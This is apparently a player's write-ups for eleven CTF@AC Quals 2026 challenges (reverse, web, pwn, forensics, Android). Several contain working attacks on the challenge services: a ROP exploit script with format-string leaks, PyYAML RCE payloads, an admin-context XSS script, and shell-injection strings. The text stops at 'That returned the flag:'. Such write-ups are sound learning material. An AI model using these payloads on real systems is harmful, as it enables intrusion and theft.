@@ -1,0 +1,846 @@
+CTF@AC Quals 2026 - Writeups - WolFYe (Tudor Boscu)
+
+1) Crossing-33 (reverse)
+
+We received a PE32 Windows executable and an encrypted flag.txt file. Running strings showed some useful messages:
+
+usage: %s <input-plaintext> <output-flag.txt>
+failed to derive round keys through the gate
+packed %lu bytes into %s
+C33G
+
+At first, the function found from the entry point looked like main, but it was only the CRT startup code. The real challenge logic was the function called with argc and argv, which I renamed to real_main.
+
+The program acts like a packer:
+crossing-33.exe <input-plaintext> <output-flag.txt>
+
+So flag.txt was not the plaintext flag, but the encrypted output produced by the binary.
+
+The file starts with a custom header:
+C33GATE
+The header stores metadata like the version, header size, plaintext size, a few state values, and a FNV-1a hash of the plaintext. The ciphertext starts after the 0x30-byte header.
+
+The interesting part was the message:
+failed to derive round keys through the gate
+
+The binary checks for Wine and Wow64-related functions, then allocates and decrypts a hidden code blob. This is a Heaven’s Gate trick: the 32-bit PE switches into 64-bit code through segment 0x33. That hidden x64 code derives the round keys used by the encryption.
+After extracting/decrypting that blob, the rest of the cipher could be understood from the main function. The encryption works on 16-byte blocks and uses 12 rounds. Since the transformation is reversible, I implemented the inverse operations in Python and decrypted the ciphertext from flag.txt.
+
+After decrypting the blocks and removing the padding/newline, the flag was:
+CTFAC{121ded77fc7fe48754143359bdefee95af4869905335908705b0d1581d651dbc}
+
+script for solution:
+
+#!/usr/bin/env python3
+import struct
+from pathlib import Path
+
+EXE = Path('crossing-33.exe')
+FLAG = Path('flag.txt')
+MASK32 = 0xffffffff
+MASK64 = 0xffffffffffffffff
+
+def u32(x): return x & MASK32
+def lo(x): return x & MASK32
+def hi(x): return (x >> 32) & MASK32
+def rol(x, n):
+    n &= 63
+    return ((x << n) | (x >> (64 - n))) & MASK64
+def ror(x, n):
+    n &= 63
+    return ((x >> n) | (x << (64 - n))) & MASK64
+def add64(a, b): return (a + b) & MASK64
+def bswap32(x): return int.from_bytes(u32(x).to_bytes(4, 'little'), 'big')
+def bswap64(x): return int.from_bytes((x & MASK64).to_bytes(8, 'little'), 'big')
+
+def load_tables(exe_bytes):
+    def words(va, n=24):
+        # .rdata VMA 0x40a000, file offset 0x8600
+        off = 0x8600 + (va - 0x40a000)
+        return list(struct.unpack('<' + 'I' * n, exe_bytes[off:off + 4 * n]))
+    return words(0x40a440), words(0x40a4a0), words(0x40a500), words(0x40a560)
+
+def pair(arr, i): return arr[2*i] | (arr[2*i + 1] << 32)
+
+def keygen(A, B, C, D, K440, K4A0, K500, K560):
+    # Reimplemented from the decrypted x64 Heaven's Gate shellcode.
+    r8 = (A | (B << 32)) & MASK64
+    r9 = (C | (D << 32)) & MASK64
+    r12 = 0x4d7c1e6b8a7935f0 ^ r8
+    r13 = 0x8bd6420f57a6c91d ^ rol(r9, 17)
+    r14 = 0xf1c26a3be490d5c7 ^ add64(r8, r9)
+    r15 = 0x6a09e667f3bcc909 ^ bswap64(r9)
+    out = []
+    for i in range(12):
+        rsi = add64(rol(r15 ^ pair(K560, i), i * 5 + 7), r12)
+        rdi = ror(add64(r14, pair(K500, i)), i * 3 + 11) ^ r13
+        rax = (rsi * 0x9e6c63d0676a9a99) & MASK64
+        rax ^= rol(rdi, 17)
+        rax = add64(rax, pair(K4A0, i))
+        rax ^= rax >> 29
+        rax = (rax * 0xc2b2ae3d27d4eb4f) & MASK64
+        rax ^= rax >> 32
+        out.extend([lo(rax), hi(rax)])
+        r11 = rol(rax, 13) ^ r13
+        rcx = add64(r14, pair(K440, i))
+        rdx = ror(rax, 7) ^ r15
+        rsi = add64(add64(rsi, rdi), i)
+        r12, r13, r14, r15 = r11, rcx, rdx, rsi
+    return out
+
+def round_F(S, i, rk, mask, K440, K4A0, K500, K560):
+    u36, u40 = lo(mask), hi(mask)
+    key = rk[2*i] | (rk[2*i + 1] << 32)
+    u33 = u36 ^ K440[2*i]
+    u40x = u40 ^ K440[2*i + 1]
+
+    t1 = add64(add64(key, pair(K560, i)), u33 | (u40x << 32)) ^ S
+    r1 = rol(t1, (i * 7) % 0x1f + 0xb)
+    r2 = rol(key ^ pair(K500, i), (i * 5) % 0x13 + 7)
+    sm = add64(r1, r2)
+    sl, sh = lo(sm), hi(sm)
+
+    lowbase = u33 ^ K4A0[2*i]
+    lowadd = lowbase + bswap32(sh)
+    carry = 1 if lowadd > MASK32 else 0
+    vallo = u32(lowadd) ^ sl
+    valhi = u32((u40x ^ K4A0[2*i + 1]) + bswap32(sl) + carry) ^ sh
+    val = vallo | (valhi << 32)
+
+    val2 = val ^ rol(key ^ val, 23)
+    x = (val2 * pair(K440, i)) & MASK64
+    x ^= x >> 31
+    y = (x * pair(K4A0, i)) & MASK64
+    y ^= y >> 28
+    return y ^ pair(K500, i)
+
+def decrypt_block(ct, block_index, header, rk, tables):
+    K440, K4A0, K500, K560 = tables
+    A, B, C, D, plain_len = header
+    w = struct.unpack('<4I', ct)
+    idx = block_index + 1
+    mask = (idx * 0x9e3779b97f4a7c15) & MASK64
+    mask ^= (plain_len * 0xd6e8feb86659fd93) & MASK64
+
+    S11 = (w[0] | (w[1] << 32)) ^ rol(C | (D << 32), 9)
+    S12 = (w[2] | (w[3] << 32)) ^ rol(A | (B << 32), 17)
+
+    states = [0] * 13
+    states[11], states[12] = S11, S12
+    for i in range(11, 0, -1):
+        states[i - 1] = states[i + 1] ^ round_F(states[i], i, rk, mask, K440, K4A0, K500, K560)
+
+    S0 = states[0]
+    C0 = states[1] ^ round_F(S0, 0, rk, mask, K440, K4A0, K500, K560)
+    rot = rol(mask, 17)
+    p0 = lo(C0) ^ A ^ lo(mask)
+    p1 = hi(C0) ^ B ^ hi(mask)
+    p2 = lo(S0) ^ C ^ lo(rot)
+    p3 = hi(S0) ^ D ^ hi(rot)
+    return struct.pack('<4I', p0, p1, p2, p3)
+
+def main():
+    exe = EXE.read_bytes()
+    data = FLAG.read_bytes()
+    K440, K4A0, K500, K560 = load_tables(exe)
+    hdr = struct.unpack('<12I', data[:0x30])
+    assert data[:8] == b'C33GATE\x00'
+    plain_len = hdr[4]
+    A, B, C, D = hdr[6], hdr[7], hdr[8], hdr[9]
+    rk = keygen(A, B, C, D, K440, K4A0, K500, K560)
+    pt = b''.join(
+        decrypt_block(data[0x30+i:0x30+i+16], i // 16, (A, B, C, D, plain_len), rk, (K440, K4A0, K500, K560))
+        for i in range(0, len(data) - 0x30, 16)
+    )[:plain_len]
+    print(pt.decode())
+
+if __name__ == '__main__':
+    main()
+        
+
+2) 8 Bit Quest (web)
+
+This challenge looked like a retro web maze, but the real logic was hidden in the room numbers, the torch patterns, and the changing door graph.
+
+The first useful observation was that room URLs were deterministic. The starting room linked to:
+
+73d3f1ba062585bce51f77d70a26be88c44b55d70f81b8bd7e2ded030ca4454a
+
+and that is exactly:
+
+sha256("167")
+
+So normal room URLs are just SHA-256 hashes of the room number.
+
+
+1. Understanding the torches
+
+Each room had 8 torches, lit or unlit. At first this looked like plain binary encoding, but the important detail was what the binary value represented.
+
+Example:
+
+- Room 167 had torches: 00100111 = 39
+- Room 397 had torches: 01001110 = 78
+
+167 is the 39th prime number, and 397 is the 78th prime number.
+
+So the torch pattern is not the room number itself. It is:
+
+the index of that room inside the ordered list of prime numbers
+
+This is the core mechanic of the whole challenge.
+
+
+2. What the rooms were saying
+
+Some rooms had a visible letter in the central tower, others were blank. Once enough rooms were collected, sorting them by the torch value / prime index gave a message.
+
+After reconstructing enough of the set, the hidden text became:
+
+"I AM WRITING THIS SPECIFIC SENTENCE TO INFORM YOU THAT THE CRYPTOGRAPHIC SALT YOU NEED TO USE FOR YOUR CURRENT APPLICATIONS IS EXACTLY PRINCESSBITS, AND I AM PADDING THE REST OF THIS TEXT WITH EXTRA WORDS TO ENSURE IT HITS EXACTLY TWO HUNDRED FIFTY FOUR."
+
+There were some missing letters during partial reconstruction because the room graph was dynamic, so different visits exposed different rooms. That is why incomplete crawls produced broken versions such as "PRINCESSBTS" instead of "PRINCESSBITS".
+
+
+3. Important detail: the graph was dynamic
+
+One trap in the challenge was that the same room could expose different outgoing doors at different times. That means the palace was not a static graph.
+
+Because of that:
+
+- one crawl was not enough
+- local reasoning was needed after each batch
+- partial data could still be useful if sorted by prime index
+
+The right approach was not to brute force everything aggressively, but to gather enough rooms to reconstruct the hidden message.
+
+
+4. Extracting the actual hint
+
+The message gives two important pieces of information:
+
+- the cryptographic salt is PRINCESSBITS
+- the sentence length is exactly 254
+
+The final sentence about "two hundred fifty four" is not filler. It points to the index boundary we need.
+
+Since the message reaches prime index 254, the hidden chamber is the next logical step:
+
+255th prime = 1613
+
+So the hidden chamber should be based on room number 1613, but not with the normal rule sha256("1613"). Instead, the challenge says we need to use the salt for the "current application".
+
+
+5. Finding the hidden room
+
+The correct construction turned out to be:
+
+sha256("1613PRINCESSBITS")
+
+This gives:
+
+b98fde03ff8f75a04d1b95515d0b1c37332eb9299720c8be92361e598bdfa5f1
+
+Opening:
+
+/b98fde03ff8f75a04d1b95515d0b1c37332eb9299720c8be92361e598bdfa5f1
+
+returned the victory page, titled "Injected Palace Room", with the flag.
+
+
+6. Final flag
+
+CTFAC{448e7dc1c138275699d8b842831eab943c527eb8dd320bdb8733cbfa94fedbda}
+
+3) Palimpsest (web)
+
+I started by looking at app.js and found the full API structure:
+
+POST /upload
+GET /api/docs
+GET /doc/{id}?v=N
+GET /diff/{id}?a=X&b=Y
+
+Inside the JavaScript there was also a hidden redacted sample object with the note that a redacted trace had been removed from the public UI. That was a strong hint that the flag was not in the normal frontend output, but somewhere inside the internal pipeline versions.
+
+The vulnerability was in the upload endpoint. It accepted a yaml field that was parsed server side with an unsafe PyYAML loader. That meant I could use !!python/object/apply to instantiate arbitrary Python objects and get code execution.
+
+I first used this payload to test for RCE:
+
+{"author":"t","yaml":"x: !!python/object/apply:subprocess.check_output [["cat","/flag.txt"]]","script":"render {\ntext: "X"\n}"}
+
+Then I checked version 1 of the document, which corresponded to the normalizer stage. The response was:
+
+{"error":"CalledProcessError","message":"Command '['cat', '/flag.txt']' returned non-zero exit status 1."}
+
+That confirmed code execution worked, but the flag was not located at /flag.txt.
+
+Next I switched to os.listdir because it was cleaner and avoided bytes decoding issues. I used this payload to enumerate the filesystem:
+
+{"author":"t","yaml":"x: !!python/object/apply:os.listdir ["/"]","script":"render {\ntext: "X"\n}"}
+
+The result in v=1 showed the root directories, including /app:
+
+["bin","boot","dev","etc","home","lib","lib64","media","mnt","opt","proc","root","run","sbin","srv","sys","tmp","usr","var","app",".dockerenv"]
+
+So I listed /app next with:
+
+{"author":"t","yaml":"x: !!python/object/apply:os.listdir ["/app"]","script":"render {\ntext: "X"\n}"}
+
+That returned:
+
+["flag.txt","app","examples","requirements.txt"]
+
+At that point I knew the flag file existed in /app, but instead of reading it directly I tried getting it from the environment first. This payload was enough:
+
+{"author":"t","yaml":"x: !!python/object/apply:os.getenv ["FLAG"]","script":"render {\ntext: "X"\n}"}
+
+The response in v=1 was:
+
+{"x":"CTFAC{86e77374aee57cdc6aef9b6562012c327b31b50bc9cbfa7d79773a8a39739a96}"}
+
+There was the flag :p
+
+4) Bank of AC (misc)
+
+I started by looking at the GitHub repository behind the dead site and checking its commit history. The visible commits were very small, only adding files like README.md and robots.txt, so there was no flag directly in the current repository state.
+
+The robots.txt file pointed to /records/, which suggested there might have been hidden content before the site disappeared. From there, I checked the Wayback Machine and found an archived snapshot of the website, including the old JavaScript bundle and CSS files.
+
+After downloading the archived JavaScript bundle, I searched through it for useful keywords such as vault, secret, flag, CTF, and route names. This showed that the app was a small React site with two routes: / and /secret. The main page had an “Unlock Vault” button that redirected to /secret after a short delay.
+
+Then I inspected the component used for the /secret route. Inside that component, there was a secret-data-box element containing a hardcoded code block with the full flag string. The important part was to extract the entire value correctly, because an earlier partial copy missed some characters in the middle.
+
+Final flag:
+CTF{dc04c2197802d1375a3ddd78b66c0cf6b194ef645ecb657e505e555c9e121075}
+I thought it was gonna be CTFAC{} the format and I ignored it at first but that's fine
+It also didn't help that i used grep and looked specifically for CTFAC not CTF but at least it worked out in the end
+
+5) Dragon Guard (pwn)
+
+The first bug was in the route label handling. The input was passed directly as a format string, so it was possible to leak stack values with payloads like %1$p and %116$p. Using this, I got a PIE leak and the stack canary.
+
+From the binary analysis, the important gadgets and functions were:
+ pop rdi
+ pop rsi
+ pop rdx
+ read@plt
+ open@plt
+ write@plt
+
+There was also a stack overflow in the route note import logic. The overflow offset was:
+- 0x88 bytes to reach the canary
+- then 8 bytes for saved RBP
+- then RIP
+
+At first I tried the classic open-read-write chain to open different possible flag paths like /flag, ./flag, /app/flag and so on, but that did not work. To verify that the ORW chain itself was correct, I used it to read known files such as /etc/hosts, which confirmed the ROP chain and file descriptor assumptions were valid.
+
+After that, instead of guessing the flag path, I used the same ORW primitive to read /proc/self/cmdline and /proc/self/environ.
+
+Reading /proc/self/cmdline showed the process was started as:
+ /usr/local/bin/wg
+ dragon-server
+ 10.13.37.1
+ 31337
+
+reading /proc/self/environ revealed the flag directly as an environment variable
+
+The final flag was CTFAC{78240deee282e8e8735981e1ca2878718a61a4903180e11830d167c85b72c247}
+
+I rerwote the script so that only the flag goes to the output. (i got it initially with a messier script i barely spotted the flag:) )
+Script:
+
+import socket
+import struct
+import time
+import re
+
+HOST = "10.13.37.1"
+PORT = 31337
+
+PIE_IDX = 1
+CANARY_IDX = 116
+
+POP_RDI = 0x65c28
+POP_RSI = 0x65c2d
+POP_RDX = 0x65c32
+SCRATCH = 0x754a0
+
+PLT_WRITE = 0x2120
+PLT_READ  = 0x2280
+PLT_OPEN  = 0x2440
+
+READ_FD = 5
+TARGET_PATH = b"/proc/self/environ\x00"
+
+def q(x):
+    return struct.pack("<Q", x)
+
+def recv_some(s, delay=0.25):
+    time.sleep(delay)
+    data = b""
+    s.setblocking(False)
+    try:
+        while True:
+            chunk = s.recv(4096)
+            if not chunk:
+                break
+            data += chunk
+    except:
+        pass
+    s.setblocking(True)
+    return data
+
+def parse_first_hex(text):
+    m = re.search(r'0x[0-9a-fA-F]+', text)
+    if not m:
+        raise ValueError(f"no hex value found in: {text!r}")
+    return int(m.group(0), 16)
+
+def leak(idx):
+    s = socket.create_connection((HOST, PORT))
+    recv_some(s)
+    s.sendall(f"%{idx}$p\n".encode())
+    out = recv_some(s).decode(errors="replace")
+    s.close()
+    return parse_first_hex(out)
+
+def build_payload(base, canary):
+    rop = b""
+
+    # read(4, scratch, 0x80) -> read path from socket
+    rop += q(base + POP_RDI) + q(4)
+    rop += q(base + POP_RSI) + q(base + SCRATCH)
+    rop += q(base + POP_RDX) + q(0x80)
+    rop += q(base + PLT_READ)
+
+    # open(scratch, 0)
+    rop += q(base + POP_RDI) + q(base + SCRATCH)
+    rop += q(base + POP_RSI) + q(0)
+    rop += q(base + PLT_OPEN)
+
+    # read(5, scratch, 0x800)
+    rop += q(base + POP_RDI) + q(READ_FD)
+    rop += q(base + POP_RSI) + q(base + SCRATCH)
+    rop += q(base + POP_RDX) + q(0x800)
+    rop += q(base + PLT_READ)
+
+    # write(4, scratch, 0x800)
+    rop += q(base + POP_RDI) + q(4)
+    rop += q(base + POP_RSI) + q(base + SCRATCH)
+    rop += q(base + POP_RDX) + q(0x800)
+    rop += q(base + PLT_WRITE)
+
+    payload = b"A" * 0x88
+    payload += q(canary)
+    payload += b"B" * 8
+    payload += rop
+    return payload
+
+def main():
+    pie_leak = leak(PIE_IDX)
+    canary = leak(CANARY_IDX)
+    base = pie_leak - POP_RDI
+
+    payload = build_payload(base, canary)
+
+    s = socket.create_connection((HOST, PORT))
+    recv_some(s)
+
+    s.sendall(b"AAAA\n")
+    recv_some(s)
+
+    s.sendall(struct.pack("<H", len(payload)) + payload)
+    time.sleep(0.05)
+    s.sendall(TARGET_PATH.ljust(0x80, b"\x00"))
+
+    out = recv_some(s, 0.6)
+    s.close()
+
+    m = re.search(rb'FLAG=(CTFAC\{[0-9a-fA-F]+\})', out)
+    if m:
+        print(m.group(1).decode())
+    else:
+        print("flag not found")
+        print(out.replace(b"\x00", b"\n").decode(errors="replace"))
+
+if __name__ == "__main__":
+    main()
+            
+
+6) Alien Respone - Second Half (Forensics)
+
+I initiated the investigation based on the state forwarded by our colleague. The critical starting point was that payload.zip could already be decrypted using the password 5H0WM3WH47Y0UG07, whereas final.zip remained encrypted. I examined the contents of payload.zip and verified the presence of a decoy flag.txt, final.zip, and relic.png.
+
+Subsequently, I focused my analytical efforts on relic.png, as it contained the most distinct remaining artifact. I inspected the PNG trailer following the IEND chunk and confirmed that the appended data was not random noise. Specifically, it contained the THRONE marker, a 16-byte hexadecimal string, and a Fernet token. Furthermore, within the PNG metadata, I located a tEXt chunk that, upon base64 decoding, yielded Created using ThroneLSP v1.1.0. This corroborated that the THRONE marker was intentional and directly associated with the image. Following this, I executed zsteg on relic.png.
+
+The relevant payload was identified within the b1,b,lsb,xy channel. The extraction from this channel resulted in the string XRL=j3_a33q_g0_t0_q33c3e. I observed that XRL corresponds to KEY encoded via ROT13. By applying the ROT13 cipher to the entire string, I obtained KEY=w3_n33d_t0_g0_d33p3r. However, this password did not directly decrypt final.zip.
+
+Consequently, I approached the THRONE block as a combination of a cryptographic salt and a Fernet token. The hexadecimal string e045be6a99bcfd8de75b5684943e1b38 was utilized as the salt. Utilizing the password w3_n33d_t0_g0_d33p3r alongside PBKDF2 HMAC SHA256 with 480000 iterations, the Fernet token was successfully decrypted, revealing pr1m3_1834N_6675W. This proved to be the correct password for final.zip, and using this credential, I successfully extracted message.raw.
+
+I then conducted multiple analytical tests on message.raw. I analyzed it as potential raw audio and generated spectrograms; however, the output consisted exclusively of uniform noise. I also evaluated various encoding schemes, including base85, base88, base91, and other basic transformations, but these yielded no coherent results.
+
+The definitive clue was derived from the password pr1m3_1834N_6675W. I hypothesized that the segment pr1m3 served not only as a password component but also as an operational instruction. I proceeded to extract the characters from message.raw that were located at prime index positions. This subset of data exhibited significant structural differences compared to the rest of the file. The prefix extracted from the prime indices consisted of exactly 1679 characters, comprising solely dots and hash symbols. The integer 1679 is the product of 23 and 73, which corresponds to the standard dimensions of the Arecibo message. Immediately following these 1679 characters, the data reverted to noise, confirming that this clean prefix was the intended payload. I rendered this prefix as a 23x73 bitmap, which proved to be the correct orientation. The resulting image directly displayed the rasterized flag, formatted in a small 3x5 pixel font.
+
+Final flag: CTFAC{41357A6F1dAb8E0bdC3898Ed3d2E5867591Eb2C5A67820A7d44E3dF36FF1bb99}
+(it might be a couple of characters off because i literally tried it and got it from the 5th try and I have all of them saved so sorry)
+
+7) Domain Expansion (web)
+
+I started by reading the handout and tracing the review flow instead of treating it like a normal reflected or stored XSS challenge.
+
+The important part was noticing that submitted content was not only sanitized and previewed, but also passed through a special reviewer path built around the custom domain-expansion element.
+
+From there, the key observation was that the review process could reach the legacy preview chain, which loaded extra assets through the relay logic and also extracted a hidden module from the HTML comment in the form DE-MODULE.
+
+That meant the goal was not to inject obvious script tags, but to build a payload that would survive into the reviewer flow and make the admin browser execute attacker-controlled JavaScript from that hidden module mechanism.
+
+I created a campaign containing a domain-expansion element with a crafted blueprint that forced the legacy pulse/relay path to load during review.
+
+Inside the campaign body, I also included a DE-MODULE comment containing base64url-encoded JavaScript. When the admin reviewed the campaign, that module executed in the privileged review context.
+
+The script then collected the values exposed in the review flow, including the review key, frame key, ward, asset id, and trace token.
+
+Using those values, it requested the cascade endpoint to obtain the temporary flag grant.
+
+After that, it computed the expected proof as a SHA-256 over the grant, trace token, and ward, then used the result to call the admin flag endpoint.
+
+Once the flag was returned, the payload stored it back into a new campaign so it became visible from the normal public campaign listing.
+
+Finally, I just polled the campaigns endpoint until the flag appeared and recovered CTFAC{88fb04fe9a41b986c1f355eec8a78277e68dda8d4acf82c493fe6f0dc189abb6}.
+
+So the solve was basically a reviewer-path JavaScript execution bug through the DE-MODULE mechanism, followed by using the intended internal review APIs to derive the correct proof and request the flag.
+
+I used scirpt:
+
+#!/usr/bin/env python3
+import argparse
+import base64
+import json
+import re
+import time
+from typing import Optional
+
+import requests
+
+
+def b64url(data: bytes) -> str:
+    return base64.urlsafe_b64encode(data).decode().rstrip("=")
+
+
+def make_blueprint() -> str:
+    shell = '<section class="legacy-card" data-bundle="legacy:pulse" data-seal="eyJraW5kIjoicmVsYXkiLCJzbG90Ijoic2VsZiJ9"><div class="legacy-topline">Inherited Barrier Sutra</div><h3>{{label}}</h3><p class="legacy-domain">{{domain}}</p></section>'
+    blueprint = {"shell": shell}
+    return b64url(json.dumps(blueprint, separators=(",", ":")).encode())
+
+
+def make_module() -> str:
+    js = r'''
+(async () => {
+  try {
+    const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+
+    const reviewKey = top.document.querySelector('meta[name="review-key"]')?.content || "";
+    const frameKey = document.querySelector('meta[name="frame-key"]')?.content || "";
+    const state = globalThis.__relayState || {};
+    const assetId = state.assetId || document.body.dataset.reviewAssetId || "";
+    const ward = state.ward || "";
+    const traceToken = state.traceToken || "";
+
+    if (!reviewKey || !frameKey || !assetId || !ward || !traceToken) {
+      return;
+    }
+
+    const cascadeResp = await fetch(`/api/review/cascade/${assetId}`, {
+      credentials: "same-origin",
+      headers: {
+        "X-Review-Key": reviewKey,
+        "X-Frame-Key": frameKey,
+        "X-Ward": ward,
+      },
+    });
+    if (!cascadeResp.ok) {
+      return;
+    }
+
+    const cascade = await cascadeResp.json();
+    const flagGrant = cascade.flagGrant || "";
+    if (!flagGrant) {
+      return;
+    }
+
+    const enc = new TextEncoder();
+    const digest = await crypto.subtle.digest(
+      "SHA-256",
+      enc.encode(`${flagGrant}:${traceToken}:${ward}`)
+    );
+    const flagProof = [...new Uint8Array(digest)]
+      .map((b) => b.toString(16).padStart(2, "0"))
+      .join("");
+
+    const flagResp = await fetch(`/api/admin/flag`, {
+      credentials: "same-origin",
+      headers: {
+        "X-Review-Key": reviewKey,
+        "X-Flag-Grant": flagGrant,
+        "X-Asset-Id": assetId,
+        "X-Frame-Key": frameKey,
+        "X-Trace-Token": traceToken,
+        "X-Flag-Proof": flagProof,
+      },
+    });
+    if (!flagResp.ok) {
+      return;
+    }
+
+    const flagJson = await flagResp.json();
+    const flag = flagJson.flag || "";
+    if (!flag) {
+      return;
+    }
+
+    await fetch(`/api/campaigns`, {
+      method: "POST",
+      credentials: "same-origin",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        title: "flag-" + Date.now(),
+        strapline: flag,
+        body: `<section class="stack"><h3>${flag}</h3><p>${flag}</p></section>`,
+      }),
+    });
+
+    await sleep(250);
+  } catch {}
+})();
+'''
+    return b64url(js.encode())
+
+
+def build_body() -> str:
+    blueprint = make_blueprint()
+    module = make_module()
+    return f'''<section class="stack">
+  <h3>Veil rehearsal</h3>
+  <p>Preview copy for the next barrier cutover.</p>
+  <domain-expansion
+    label="veil-rehearsal"
+    domain="veil-rehearsal.barrier-zone.test"
+    data-blueprint="{blueprint}"
+  ></domain-expansion>
+  <!-- DE-MODULE:{module} -->
+</section>'''
+
+
+def create_campaign(base: str, session: requests.Session) -> str:
+    payload = {
+        "title": "Domain Expansion",
+        "strapline": "review path test",
+        "body": build_body(),
+    }
+    r = session.post(f"{base}/api/campaigns", json=payload, timeout=15)
+    r.raise_for_status()
+    return r.json()["id"]
+
+
+def report_campaign(base: str, session: requests.Session, cid: str) -> None:
+    r = session.post(f"{base}/api/report", json={"id": cid}, timeout=15)
+    r.raise_for_status()
+
+
+def poll_flag(base: str, session: requests.Session, timeout_s: int = 25) -> Optional[str]:
+    deadline = time.time() + timeout_s
+    pat = re.compile(r"CTFAC\{[0-9a-fA-F]{64}\}")
+    while time.time() < deadline:
+        r = session.get(f"{base}/api/campaigns", timeout=15)
+        r.raise_for_status()
+        items = r.json().get("items", [])
+        for item in items:
+            text = f'{item.get("title","")} {item.get("strapline","")}'
+            m = pat.search(text)
+            if m:
+                return m.group(0)
+
+            cid = item.get("id")
+            if cid:
+                r2 = session.get(f"{base}/api/campaigns/{cid}", timeout=15)
+                if r2.ok:
+                    body = r2.text
+                    m = pat.search(body)
+                    if m:
+                        return m.group(0)
+        time.sleep(1.2)
+    return None
+
+
+def main() -> int:
+    ap = argparse.ArgumentParser()
+    ap.add_argument("base", help="base url, e.g. http://92049debbe566ca5.ctf.ac.upt.ro")
+    args = ap.parse_args()
+
+    base = args.base.rstrip("/")
+    session = requests.Session()
+
+    try:
+        cid = create_campaign(base, session)
+        print(f"[+] created campaign: {cid}")
+        report_campaign(base, session, cid)
+        print("[+] report queued")
+        flag = poll_flag(base, session)
+        if flag:
+            print(f"[+] FLAG: {flag}")
+            return 0
+
+        print("[-] no flag found yet")
+        print("[*] check /api/campaigns manually and rerun if needed")
+        return 1
+    except Exception as e:
+        print(f"[-] error: {e}")
+        return 1
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
+
+8) Chronomancer
+
+The binary was a stripped Rust ELF, so at first Ghidra showed a lot of Rust runtime stuff instead of the real challenge code.
+
+I searched for the useful strings:
+
+chronokey>
+causal checksum rejected
+timeline stabilized
+temporal noise detected
+
+Following the reference to chronokey> got me to the actual main logic. The program reads our input, copies it into a buffer, then loads a bytecode blob from the binary and runs it through a custom VM.
+
+The bytecode was around DAT_00140b79 and had size 0x1127. The VM had custom opcodes for loading input bytes, xor/add/rotate operations, sbox lookups, jumps, and a final checksum check.
+
+The final check was not just strcmp. It checked that an error accumulator stayed zero, and that the final checksum matched:
+
+0x842302eebd1821e5
+
+The thing that made the flag recoverable was that the VM basically checked the input byte by byte. Each character was transformed and then compared with an expected value. If it was wrong, the error accumulator changed.
+
+So I wrote a small Python emulator for the VM and brute-forced each flag character from the expected charset:
+CTFAC{}0123456789abcdef
+
+It worked out:)
+
+9) Babydroid (rev APK)
+
+I started by looking through the APK statically instead of trying to brute force anything from the app.
+The app looked pretty simple. It had a Base URL field, an input for some text, an Encrypt button, then it showed a Key state and a Ciphertext.
+At first I expected a local flag check or some hardcoded hash, but the app was not doing that. It was getting data from the server, transforming it, then using it as an AES key.
+In the APK, the important part was in GhostBoxKt and some obfuscated classes like mw, qa, qh0, di and dl0.
+
+The hidden endpoint was not written directly. It was built from base64 strings that were XORed with the key baby_secret_key.
+
+After decoding those strings, the hidden route was:
+/v1/hidden/flag
+The other important route was built in the encryption logic:
+/takei/ppv1?n=7&shift=3
+This endpoint was used to build the AES key.
+
+The tricky part was how the app handled the response. It made a GET request, read the response line by line with readLine, and added every line into one big string. That means the newlines were removed.
+After that, the app applied a Caesar shift of plus 3 on letters, then reversed the whole string.
+That final string was used as the key source.
+
+The AES key was:
+SHA256(key source), first 16 bytes
+So basically AES 128 with AES GCM NoPadding. The encrypted blob format was:
+first 12 bytes nonce
+rest ciphertext plus tag
+
+The remote gave a 404 response for:
+/takei/ppv1?n=7&shift=3
+but that 404 body was still used by the app to derive the key.
+The hidden endpoint:
+/v1/hidden/flag
+returned a long base64 blob.
+
+I initially got stuck because I copied the 404 body from curl with newlines included. The app does not keep those newlines, because it uses readLine and concatenates the lines. That changed the SHA256 completely, so AES GCM kept failing.
+After fixing that, the decrypt worked.
+
+I also used the emulator to confirm the behaviour. I installed the APK, ran a local server through 10.0.2.2:8000, and saw that the app really requested:
+/v1/hidden/flag
+/takei/ppv1?n=7&shift=3
+
+Using uiautomator dump, I also checked the Key state shown in the UI and it matched the transformed 404 body, so the logic was corect.
+
+In the end the solve was:
+get the 404 body from /takei/ppv1?n=7&shift=3
+remove newlines like the app does
+apply Caesar plus 3 on letters
+revrese the result
+
+take SHA256 of it and keep the first 16 bytes
+
+download the base64 blob from /v1/hidden/flag
+base64 decode it
+
+use the first 12 bytes as nonce
+decrypt the rest with AES GCM
+
+The flag was:
+CTFAC{1d7a45f59c3ba3d823da185d5daf03c6706b631cfb74efcf21c0dd23cc3fb915}
+This was not really about breaking AES. The crypto was normal, but the main part was understanding exactly how the Android app built the key and noticing that the 404 body still mattered lol.
+
+10) Incrementing Down (web)
+
+I first checked whether the challenge had hidden endpoints or useful query parameters, but none of that changed the behavior in a meaningful way. The page always returned the same app, and the interesting part was clearly the ASCII counter.
+After that, I started treating it as a stateful timing challenge instead of a normal web enum challenge. The important observation was that different request patterns affected the counter differently. Heavy flooding mostly froze it, while a steady stream of requests made it drift downward.
+To work with it properly, I wrote a small parser for the ASCII digits so I could monitor the displayed value instead of guessing from the box-drawing characters. Once I could read the counter reliably, I noticed that regular GET requests at about one per second were enough to keep pushing it down.
+From there, the solution was just to keep the request rhythm stable and watch the value decrease. When it reached zero and went below it, the counter renderer broke and the application replaced the ASCII display with the flag.
+
+Flag:
+CTFAC{1d844122621eba48f18d4755e677e024159b66c4a5260dcc0868d14f704bae65}
+
+11) Wireless Hotspot (web)
+
+The first useful thing was that authentication was weak. Access to the panel could be bypassed just by setting the cookie logindat=1, which gave access to pages like wireless.html, internet.html, usage.html, messages.html, and setting.html.
+
+After getting into the panel, I checked the available pages and CGI endpoints. The HTML showed several forms using endpoints like /cgi-bin/getconfig.cgi and /cgi-bin/setconfig.cgi, and the message page revealed another endpoint: /cgi-bin/smspost.cgi. That one looked interesting because it was the only feature that directly processed user-controlled input and returned a visible response.
+
+By testing smspost.cgi, I noticed the response always echoed the message and then printed a wc: line. That suggested the backend was probably building a shell command with the message inside quotes. Simple payloads like ; id or $(id) did not work by themselves, but adding a quote to break out of the existing string did.
+
+The payload style that worked was:
+'; command #
+
+Those confirmed command injection and showed that commands were running as www-data, with the CGI scripts located in /usr/local/apache2/cgi-bin.
+
+From there, I used short enumeration commands through the same injection to inspect the filesystem. Listing /tmp revealed a file named flag.txt, which was the main clue:
+'; ls -la /tmp #
+
+That output showed /tmp/flag.txt, so the final step was just to read it with:
+'; cat /tmp/flag.txt #
+
+That returned the flag:
